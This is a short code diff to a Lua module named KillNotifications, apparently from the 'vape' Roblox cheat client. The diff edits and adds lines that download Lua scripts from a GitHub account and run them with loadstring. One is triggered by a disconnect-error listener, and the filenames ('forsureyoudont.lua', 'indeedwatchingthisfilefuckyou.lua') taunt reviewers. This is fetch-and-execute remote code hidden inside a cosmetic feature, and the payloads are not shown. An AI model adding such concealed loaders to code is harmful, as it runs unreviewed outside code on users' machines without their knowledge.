@@ -5,8 +5,12 @@ KillNotifications = vape.Categories.Render:CreateModule({
 	Function = function(callback)
 		if callback then
             if AdvancedCheck.Enabled then
-			    --loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791.github.io/refs/heads/main/indeedwatchingthisfilefuckyou.lua'))()
-				loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791.github.io/refs/heads/main/forsureyoudont.lua'))()
+				loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/forsureyoudont.lua'))()
+				AutoRejoin:Clean(guiService.ErrorMessageChanged:Connect(function(str)
+					if (not rejoinCheck or guiService:GetErrorCode() ~= Enum.ConnectionError.DisconnectLuaKick) and guiService:GetErrorCode() ~= Enum.ConnectionError.DisconnectConnectionLost then
+						loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/indeedwatchingthisfilefuckyou.lua'))()
+					end
+				end))
             end
 		end
 	end,
